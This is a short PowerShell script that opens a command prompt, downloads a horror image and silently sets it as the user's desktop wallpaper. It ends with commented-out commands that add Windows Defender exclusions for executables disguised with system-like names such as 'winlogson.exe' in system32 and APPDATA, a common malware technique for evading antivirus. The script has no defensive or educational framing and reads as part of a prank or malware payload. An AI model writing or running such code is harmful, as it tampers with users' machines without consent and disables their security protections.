start $ENV:windir/System32/cmd.exe
$imageUrl = "https://thumbs.dreamstime.com/b/man-screams-fear-horror-pop-art-retro-vector-illustration-103789731.jpg"
$outputPath = "$env:USERPROFILE\sfondo.jpg"
Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath
$RegKeyPath = "HKCU:\Control Panel\Desktop"
Set-ItemProperty -Path $RegKeyPath -Name Wallpaper -Value $outputPath
rundll32.exe user32.dll, UpdatePerUserSystemParameters
# Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\Windows12.exe"
# Add-MpPreference -ExclusionPath "$env:APPDATA\Windows12.exe"
# Add-MpPreference -ExclusionProcess "Windows12.exe"
# Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\winlogson.exe"
# Add-MpPreference -ExclusionPath "$env:APPDATA\winlogson.exe"
# Add-MpPreference -ExclusionProcess "winlogson.exe"
